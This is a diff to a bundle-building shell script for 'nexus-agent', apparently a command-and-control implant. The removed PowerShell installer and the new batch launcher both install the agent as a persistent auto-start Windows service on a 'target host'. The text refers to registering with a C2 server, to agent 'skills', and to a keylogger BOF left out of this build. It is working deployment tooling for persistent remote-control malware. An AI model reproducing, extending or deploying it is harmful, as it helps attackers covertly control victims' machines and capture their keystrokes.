@@ -280,80 +280,20 @@ SCRIPT_EOF
         chmod 755 "${BUNDLE}/install-linux.sh"
 
     else
-        # install-windows.ps1
-        cat > "${BUNDLE}/install-windows.ps1" <<PSEOF
-# install-windows.ps1 — deploy this nexus-agent bundle on a Windows host.
-# Run from an elevated (Administrator) PowerShell prompt.
-#Requires -RunAsAdministrator
-
-\$ErrorActionPreference = 'Stop'
-\$root  = 'C:\ProgramData\nexus-agent'
-\$svc   = 'nexus-agent'
-\$exe   = "\$root\nexus-agent.exe"
-\$here  = Split-Path -Parent \$MyInvocation.MyCommand.Path
-
-Write-Host "[install] creating install directory: \$root"
-New-Item -Path \$root -ItemType Directory -Force | Out-Null
-
-Write-Host "[install] copying files"
-Copy-Item "\$here\nexus-agent.exe"  "\$exe"          -Force
-Copy-Item "\$here\ca.crt.pem"       "\$root\ca.crt.pem"     -Force
-Copy-Item "\$here\client.crt.pem"   "\$root\client.crt.pem" -Force
-Copy-Item "\$here\client.key.pem"   "\$root\client.key.pem" -Force
-
-Write-Host "[install] locking down client.key.pem"
-\$key = "\$root\client.key.pem"
-icacls \$key /inheritance:r | Out-Null
-icacls \$key /grant:r "SYSTEM:(R)" "Administrators:(R)" | Out-Null
-
-# --- NSSM setup ---
-if (-not (Get-Command nssm -ErrorAction SilentlyContinue)) {
-    Write-Host "[install] downloading NSSM..."
-    \$tmp = "\$env:TEMP\nssm.zip"
-    Invoke-WebRequest -Uri 'https://nssm.cc/release/nssm-2.24.zip' -OutFile \$tmp
-    Expand-Archive \$tmp -DestinationPath "\$env:TEMP\nssm_extract" -Force
-    Copy-Item "\$env:TEMP\nssm_extract\nssm-2.24\win64\nssm.exe" 'C:\Windows\System32\nssm.exe'
-    Remove-Item \$tmp -Force
-    Remove-Item "\$env:TEMP\nssm_extract" -Recurse -Force
-}
-
-\$existing = Get-Service \$svc -ErrorAction SilentlyContinue
-if (\$existing) {
-    Write-Host "[install] stopping existing service"
-    nssm stop \$svc confirm 2>\$null
-    nssm remove \$svc confirm 2>\$null
-}
-
-Write-Host "[install] registering service with NSSM"
-nssm install \$svc \$exe
-nssm set \$svc AppDirectory \$root
-nssm set \$svc Start SERVICE_AUTO_START
-nssm set \$svc AppStdout "\$root\agent.out.log"
-nssm set \$svc AppStderr "\$root\agent.err.log"
-nssm set \$svc AppRotateFiles 1
-nssm set \$svc AppRotateBytes 10485760
-
-nssm set \$svc AppEnvironmentExtra \`
-    "NEXUS_CA_CERT=\$root\ca.crt.pem" \`
-    "NEXUS_CLIENT_CERT=\$root\client.crt.pem" \`
-    "NEXUS_CLIENT_KEY=\$root\client.key.pem" \`
-    "NEXUS_SERVER_ADDR=${SERVER_ADDR}" \`
-    "RUST_LOG=info"
-
-Write-Host "[install] starting service"
-nssm start \$svc
-
-Write-Host "[install] done. Service status:"
-Get-Service \$svc
-
-Write-Host ""
-Write-Host "Logs: \$root\agent.out.log  (stdout)"
-Write-Host "      \$root\agent.err.log  (stderr)"
-Write-Host ""
-Write-Host "After the agent connects, check the C2 server journal for:"
-Write-Host "  INFO agent registered peer_id=<hex>"
-Write-Host "Then add that peer_id to /etc/nexus/capabilities.json on the server."
-PSEOF
+        # install.bat — thin launcher; the binary handles everything else.
+        cat > "${BUNDLE}/install.bat" <<BATEOF
+@echo off
+echo [install] running nexus-agent.exe --install (requires Administrator)
+"%~dp0nexus-agent.exe" --install
+if %ERRORLEVEL% NEQ 0 (
+    echo [install] FAILED with exit code %ERRORLEVEL%
+    exit /b %ERRORLEVEL%
+)
+echo [install] done.
+echo [install] verify:  sc query nexus-agent
+echo [install] logs:    C:\ProgramData\nexus-agent\agent.log
+echo [install] remove:  nexus-agent.exe --uninstall
+BATEOF
     fi
 
     # ---------- README.txt ----------
@@ -361,12 +301,12 @@ PSEOF
         BOF_NOTE="NOTE: keylogger BOF is NOT included in this binary. This agent was
        cross-compiled from Linux; the BOF requires MSVC (cl.exe) on the
        build host. All other skills are fully functional."
-        DEPLOY_STEPS="1. Copy this folder to C:\\ProgramData\\nexus-agent\\ on the target host.
-2. Open an elevated PowerShell prompt.
-3. Run: .\\install-windows.ps1
-4. Check logs at C:\\ProgramData\\nexus-agent\\agent.out.log"
-        LOG_PATH="C:\\ProgramData\\nexus-agent\\agent.out.log  (stdout)
-  C:\\ProgramData\\nexus-agent\\agent.err.log  (stderr)"
+        DEPLOY_STEPS="1. Copy this folder anywhere on the target host.
+2. Open an elevated cmd.exe (right-click -> Run as administrator).
+3. Run: install.bat   (or directly: nexus-agent.exe --install)
+4. Verify: sc query nexus-agent
+5. Check logs: C:\\ProgramData\\nexus-agent\\agent.log"
+        LOG_PATH="C:\\ProgramData\\nexus-agent\\agent.log"
     else
         BOF_NOTE=""
         DEPLOY_STEPS="1. Copy this folder to the target Linux host.
